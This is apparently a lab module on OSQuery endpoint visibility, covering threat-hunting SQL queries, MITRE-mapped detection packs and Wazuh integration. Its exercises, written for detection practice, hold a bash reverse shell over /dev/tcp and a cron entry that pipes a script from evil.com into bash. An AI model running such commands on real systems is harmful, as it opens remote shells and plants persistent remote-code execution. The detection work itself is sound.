# Module 04 — OSQuery Endpoint Visibility

## SQL Queries Against Your Endpoint State

OSQuery turns your OS into a queryable database. Unlike traditional agents, you can ask ad-hoc questions about processes, network connections, files, users, and hardware in real-time using standard SQL.

---

## Architecture

```
┌─────────────────────────────────────────────────────┐
│                  OSQuery Stack                      │
│                                                     │
│  osqueryi (interactive)  osqueryd (scheduled daemon)│
│         │                        │                  │
│         ▼                        ▼                  │
│    Ad-hoc Queries         Scheduled Packs           │
│                                │                    │
│                    ┌───────────┴──────────┐         │
│                    │                      │         │
│              soc-detections.conf   incident-response│
│              (12 threat detections) (15 IR queries) │
│                                                     │
│  Output: /var/log/osquery/osqueryd.results.log      │
│     │                                               │
│     └──► Wazuh Agent ──► Wazuh SIEM ──► Alerts     │
└─────────────────────────────────────────────────────┘
```

---

## Installation

```bash
sudo ./install-osquery.sh
```

---

## Interactive Queries (osqueryi)

### Immediate Threat Hunting

```sql
-- Find all established outbound connections
osqueryi "SELECT p.name, p.pid, n.remote_address, n.remote_port
          FROM process_open_sockets n
          JOIN processes p ON n.pid = p.pid
          WHERE n.state = 'ESTABLISHED' AND n.remote_port != 0;"

-- Detect shells spawned by web servers (webshell indicator)
osqueryi "SELECT p.name, p.cmdline, pp.name AS parent
          FROM processes p JOIN processes pp ON p.parent = pp.pid
          WHERE p.name IN ('bash','sh','python','perl')
          AND pp.name IN ('apache2','nginx','php-fpm');"

-- Find processes running from /tmp or /dev/shm (fileless malware)
osqueryi "SELECT pid, name, path, cmdline, uid
          FROM processes
          WHERE path LIKE '/tmp/%' OR path LIKE '/dev/shm/%';"

-- Check all SUID binaries
osqueryi "SELECT path, username, permissions FROM suid_bin;"

-- Scan open ports with owning process
osqueryi "SELECT l.port, l.protocol, p.name, p.pid, p.cmdline
          FROM listening_ports l JOIN processes p ON l.pid = p.pid
          WHERE l.port > 0 ORDER BY l.port;"

-- Recent logins
osqueryi "SELECT type, user, host, time, tty FROM logged_in_users ORDER BY time DESC;"

-- Kernel modules loaded (rootkit check)
osqueryi "SELECT name, size, used_by FROM kernel_modules ORDER BY name;"
```

---

## Detection Packs

### `packs/soc-detections.conf` — 12 Continuous Detections

| Query | MITRE | Interval |
|-------|-------|----------|
| C2/backdoor port connections | T1071 | 60s |
| Webshell detection | T1505.003 | 60s |
| Suspicious cron jobs | T1053.003 | 300s |
| Non-standard SUID binaries | T1548.001 | 300s |
| Unexpected listening ports | T1049 | 120s |
| Privilege escalation attempts | T1068 | 300s |
| SSH authorized_keys changes | T1098.004 | 600s |
| Hidden files in /tmp /dev/shm | T1564.001 | 300s |
| LD_PRELOAD injection | T1574.006 | 120s |
| Fileless malware processes | T1055 | 120s |
| New user accounts | T1136.001 | 600s |
| Non-standard DNS queries | T1071.004 | 120s |

### `packs/incident-response.conf` — 15 IR Queries

Activated during incident response for deep endpoint visibility:
- Full process tree with parent-child relationships
- All active TCP connections with owning processes
- Open file handles per process
- Loaded kernel modules (rootkit check)
- Current logged-in users
- Shell command history (last 200 commands)
- Full crontab enumeration
- FIM file change events
- ARP cache (ARP spoofing detection)
- Current firewall rules (iptables)
- Hash all running executables
- /etc/hosts tampering detection

---

## Log Analysis

```bash
# View live results
tail -f /var/log/osquery/osqueryd.results.log | python3 -m json.tool

# Filter for specific query
grep "webshell" /var/log/osquery/osqueryd.results.log | jq .

# Find C2 connection alerts
grep "proc_net_activity" /var/log/osquery/osqueryd.results.log | jq '.columns'

# Count detections by type
grep '"name":' /var/log/osquery/osqueryd.results.log | sort | uniq -c | sort -rn
```

---

## Integration with Wazuh

OSQuery results flow to Wazuh for correlation:

```xml
<!-- Add to /var/ossec/etc/ossec.conf on Wazuh agent -->
<localfile>
  <log_format>json</log_format>
  <location>/var/log/osquery/osqueryd.results.log</location>
</localfile>
```

Wazuh rules fire on OSQuery `added` events with action=`added` (new detections).

---

## Hands-on Exercises

### Exercise 1: Detect a Reverse Shell
```bash
# Terminal 1 (attacker sim): Start a listener
nc -lvp 4444

# Terminal 2: Create a reverse shell
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &

# Terminal 3: OSQuery should catch it within 60s
tail -f /var/log/osquery/osqueryd.results.log | grep proc_net_activity
```

### Exercise 2: Detect Cron Persistence
```bash
# Add malicious cron
echo "*/5 * * * * curl http://evil.com/shell.sh | bash" | crontab -

# OSQuery detects within 5 minutes
grep "suspicious_cron" /var/log/osquery/osqueryd.results.log
```

### Exercise 3: Incident Response Mode
```bash
# Copy IR pack to active packs directory
cp packs/incident-response.conf /etc/osquery/packs/

# Add to osquery.conf packs section, then restart
systemctl restart osqueryd

# All 15 IR queries now run — deep visibility activated
```
